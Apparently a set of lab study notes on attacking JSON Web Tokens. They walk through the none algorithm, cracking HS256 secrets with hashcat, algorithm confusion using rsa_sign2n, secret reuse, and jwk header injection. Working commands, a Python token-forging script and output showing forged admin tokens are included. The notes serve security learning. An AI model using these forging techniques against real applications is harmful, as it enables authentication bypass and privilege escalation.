# JWTs
- [Overview](#overview)
- [Attacks on JWTs](#attacks-on-jwts)
    - [Attacking Signature Verification](#attacking-signature-verification)
    - [Attacking the Signing Secret](#attacking-the-signing-secret)
    - [Algorithm Confusion](#algorithm-confusion)
    - [Reusing JWT Secrets](#reusing-jwt-secrets)
    - [Exploiting jwk](#exploiting-jwk)
    - [Exploiting jku](#exploiting-jku)



## Overview
- A JWT can either utilize JSON Web Signature (JWS) or JSON Web Encryption (JWE) for protection of the data contained within the JWT
- Two additional standards comprise JWTs. These are JSON Web Key (JWK) and JSON Web Algorithm (JWA). While JWK defines a JSON data structure for cryptographic keys, JWA defines cryptographic algorithms for JWTs.
## Attacks on JWTs
## Attacking Signature Verification
- **Missing Signature Verification**
    - We can simply manipulate that parameter in the payload, and jwt.io will automatically re-encode the JWT on the left side. This will invalidate the JWT's signature.

    - Before accepting a JWT, the web application must verify the JWT's signature to ensure it has not been tampered with. If the web application is misconfigured to accept JWTs without verifying their signature, we can manipulate our JWT to escalate privileges.

- **None Algorithm Attack**
    - To forge a JWT with the none algorithm, we must set the alg-claim in the JWT's header to none. We can achieve this using [CyberChef](https://cyberchef.io/) by selecting the JWT Sign operation and setting the Signing algorithm to None.

## Attacking the Signing Secret

> [!NOTE] JWT supports three symmetric algorithms based on potentially guessable secrets: HS256, HS384, and HS512.

- **Cracking the Secret**
    - We will use hashcat to brute-force the JWT's secret. Hashcat's mode 16500 is for JWTs. To brute-force the secret. Save the JWT to a file: `echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0 > jwt.txt`
   
    ```bash
    hashcat -m 16500 jwt.txt /SecLists/Passwords/Leaked-Databases/rockyou.txt

    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 0 (JWT (JSON Web Token))
    Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaH...l3WTW0
    Time.Started.....: Sat Mar 23 15:24:17 2024 (2 secs)
    Time.Estimated...: Sat Mar 23 15:24:19 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/SecLists/Passwords/Leaked-Databases/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  3475.1 kH/s (0.50ms) @ Accel:512 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 4358144/14344384 (30.38%)
    Rejected.........: 0/4358144 (0.00%)
    Restore.Point....: 4354048/14344384 (30.35%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: rb270990 -> raynerleow
    Hardware.Mon.#1..: Util: 52%

    # To show the secret
    hashcat -m 16500 jwt.txt /SecLists/Passwords/Leaked-Databases/rockyou.txt --show
    ```
    - Now that we have successfully brute-forced the JWT's signing secret, we can forge valid JWTs. After manipulating the JWT's body, we can paste the signing secret into jwt.io. The site will then compute a valid signature for our manipulated JWT.


## Algorithm Confusion
- Algorithm confusion is a JWT attack that forces the web application to use a different algorithm to verify the JWT's signature than the one used to create it.

> [!IMPORTANT]
> This attack only works if the web application uses the algorithm specified in the alg-claim of the JWT to determine the algorithm for signature verification

- While this public key is often provided by the web application, there are cases where we cannot obtain it directly. However, since the key is not meant to be kept private, it can be computed from the JWTs themselves.

- To achieve this, we will use [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n). The tool comes with a docker container we can use to compute the public key used to sign the JWTs.

```bash
# We can build the docker container like so:
git clone https://github.com/silentsignal/rsa_sign2n

cd rsa_sign2n/standalone/

docker build . -t sig2n

# Now we can run the docker container:
docker run -it sig2n /bin/bash
```
- We must provide the tool with two different JWTs signed with the same public key to run it. We can obtain multiple JWTs by sending the login request multiple times in Burp Repeater. Afterward, we can run the script in the docker container with the captured JWTs:
```bash
python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTI3MTkyOX0.<SNIP> eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTI3MTk0Mn0.<SNIP>

[*] GCD:  0x1
[*] GCD:  0xb196 <SNIP>
[+] Found n with multiplier 1  :
 0xb196 <SNIP>
[+] Written to b1969268f0e66b1c_65537_x509.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM'
[+] Written to b1969268f0e66b1c_65537_pkcs1.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.vFrCp8X_-Te6ENlAi4-a_xitEaOSfEzQIbQbzXpWnVE'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.vFrCp8X_-Te6ENlAi4-a_xitEaOSfEzQIbQbzXpWnVE
```

> [!IMPORTANT]
> The tool may compute multiple public key candidates. To reduce the number of candidates, we can rerun it with different JWTs captured from the web application.

- Additionally, the tool automatically creates symmetric JWTs signed with the computed public key in different formats. We can use these JWTs to test for an algorithm confusion vulnerability.
- Furthermore, if we send this token to the web application, it is accepted. Thus proving that the web application is vulnerable to algorithm confusion.

- **Forging a Token**
    1. rsa_sign2n conveniently saves the public key to a file within the docker container:
        ```bash
        cat b1969268f0e66b1c_65537_x509.pem

        -----BEGIN PUBLIC KEY-----
        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
        dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
        7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
        6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
        kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
        OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
        VQIDAQAB
        -----END PUBLIC KEY-----
        ```
    2. We can use CyberChef to forge our JWT by selecting the JWT Sign operation. We must set the Signing algorithm to HS256 and paste the public key into the Private/Secret key field. Additionally, we need to add a newline (\n) at the end of the public key:
    ![jwt-algconfution](/images/jwt_algconfusion.jpg)


## Reusing JWT Secrets
- Context: JSON Web Tokens (JWTs) are widely used for authentication in web applications.
- Best Practice: Each web application should have a unique JWT signing secret.
- Risk: If multiple applications share the same secret, a token from one app can potentially be used on another (token reuse).

- **🛑 Why It’s a Problem**
    - Cross-application access: A token valid on App A may also be accepted by App B if both use the same secret.

    - Privilege escalation: If the reused token contains elevated privileges, this could bypass role-based access controls in another application.

- **Example Scenario**
    - A company operates two apps:
        - socialA.htb (user is a moderator)
        - socialB.htb (user is a regular user)

    - JWT from socialA.htb contains:
        - {"role": "moderator"}
    - JWT from socialB.htb contains:
        - {"role": "user"}
    - Issue: If both apps use the same secret, the user can:
        - Take the moderator token from socialA and present it to socialB then gain unauthorized moderator access on socialB

## Exploiting jwk
- The "jwk" (JSON Web Key) Header Parameter is the public key that corresponds to the key used to digitally sign the JWS. 
- This key is represented as a JSON Web Key. Use of this Header Parameter is OPTIONAL.

- jwk contains information about the public key used for key verification for asymmetric JWTs. If the web application is misconfigured to accept arbitrary keys provided in the jwk claim, we could forge a JWT, sign it with our own private key, and then provide the corresponding public key in the jwk claim for the web application to verify the signature and accept the JWT.

    ![Jwk](/images/jwt_jwk_1.png)

- **Exploitation:**
    1. Generate our own keys to sign the JWT
        ```bash
        openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048

        openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
        ```

        - With these keys, we need to perform the following steps:
            - Manipulate the JWT's payload to set the isAdmin claim to True
            - Manipulate the JWT's header to set the jwk claim to our public key's details
            - Sign the JWT using our private key

    2. Automate the exploitation
        ```bash
        pip3 install pyjwt cryptography python-jose
        ```
        ```python
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import serialization
        from jose import jwk
        import jwt

        # JWT Payload
        jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

        # convert PEM to JWK
        with open('exploit_public.pem', 'rb') as f:
            public_key_pem = f.read()
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
        jwk_key = jwk.construct(public_key, algorithm='RS256')
        jwk_dict = jwk_key.to_dict()

        # forge JWT
        with open('exploit_private.pem', 'rb') as f:
            private_key_pem = f.read()
        token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

        print(token)
        ```
        ```bash
        python3 exploit.py 
        eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6InJ0eV96YWRVSjJBZFpfQ3BqaDJCRlVQd2YtWnlWeUt6aWYzbjZZc3ZxVWlwZjh5ZVNpSGk2RFJVRm9ibzVfMnpnSnRQeVVGTmNyRzIwSWd6cTdobzRDNWRfcVN0d2RfVnRfcHQ0Q0Zmdm1CZHRlZzVTcmJIYVVlbU1CQXFYbVB6S2sxOUNOVkZTdVhqa21mSk9OZ1Q3Q3VoRFV5bTFiN3U3TjNsQmlZVmh2Rnl5NVZ1dHplNkN2MS1aMTF0THhCaEF4cnlNTHNsSG1HODZmNld5ZTAwcGYyR21xel93LTdGT3dfcUFZdUwtZlpMVXNZSVltT01PVDAxa3pMV1VWSDJ0R2VYNGdYaVc2YU94cC1SNFd4NUo5ai1QZlFjcVFTOXduOHZ0Ry1rSjBQYlRVbGozUi12djk3d0VLcEZuanhzSGxWN1Rvcm9nSWJKTDZ4YUZJR3YxUSJ9LCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZX0.FimEK1Cnw1PL8Krt7mpzIcBAkVgTOAVquh7yUFIr3xrQmaDzObxmlkOZmHwmBN1Odc0NOZToWVo_o-0Yf1ldPvueGlCShlUyoOyFMVQhiWcW_EIpCPdRoG60Venyp6ePHirrZGPSXz4JAKUKRdj4CWK_2sIHlQmGmmMy0W1hL-08Dq-oueYWY-OsshDrbyMx6ibZ8vmVL4PkiBv6PalPDIrIrJZHEM0tr0IotZy_MNiOF2Rvy22XU2FapIj0cuCL21vud9k_IQZwVhPdEJ_XEnnLiFYRYI0wBl3SQ9N4xtt0eMPSe4CqtOd4veYT1JCmqL6jKkkumIqdUHcdQhA_Aw
        ```


